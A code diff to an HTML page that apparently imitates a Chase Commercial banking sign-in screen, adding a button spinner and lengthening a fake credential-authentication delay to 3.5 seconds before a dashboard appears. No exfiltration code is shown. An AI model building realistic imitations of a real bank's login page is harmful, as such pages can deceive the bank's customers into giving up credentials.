@@ -1794,6 +1794,25 @@
             cursor: pointer;
             text-decoration: none;
         }
+
+        /* Loading Spinner for Sign In Button */
+        .btn-spinner {
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            border: 2px solid rgba(255, 255, 255, 0.4);
+            border-radius: 50%;
+            border-top-color: #ffffff;
+            animation: btnSpin 0.8s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes btnSpin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
     </style>
 </head>
 
@@ -2223,9 +2242,11 @@
                 <!-- Sub Links -->
                 <div
                     style="margin-top:20px; display:flex; flex-direction:column; gap:10px; font-size:13px; font-weight:600;">
-                    <a href="javascript:void(0)" style="color:#117aca; text-decoration:none;" onclick="alert('Password Reset Link: Please contact Chase Commercial Administrator.')">Forgot
+                    <a href="javascript:void(0)" style="color:#117aca; text-decoration:none;"
+                        onclick="alert('Password Reset Link: Please contact Chase Commercial Administrator.')">Forgot
                         username/password? ›</a>
-                    <a href="javascript:void(0)" style="color:#117aca; text-decoration:none;" onclick="alert('Enrollment Portal: Commercial Online Banking Registration')">Not
+                    <a href="javascript:void(0)" style="color:#117aca; text-decoration:none;"
+                        onclick="alert('Enrollment Portal: Commercial Online Banking Registration')">Not
                         enrolled? Sign up now. ›</a>
                 </div>
             </div>
@@ -3515,20 +3536,21 @@
             console.log('[Auth Validation] Credentials accepted for:', username);
 
             btnList.forEach(btn => {
-                btn.innerText = 'Authenticating Credentials...';
-                btn.style.opacity = '0.8';
+                btn.innerHTML = '<span class="btn-spinner"></span> Authenticating credentials...';
+                btn.style.opacity = '0.85';
                 btn.disabled = true;
             });
 
+            // 3.5 seconds loading state before transitioning to dashboard
             setTimeout(() => {
                 btnList.forEach(btn => {
-                    btn.innerText = 'Sign in';
+                    btn.innerHTML = 'Sign in';
                     btn.style.opacity = '1';
                     btn.disabled = false;
                 });
 
                 switchView('dashboard');
-            }, 650);
+            }, 3500);
 
             return false;
         }
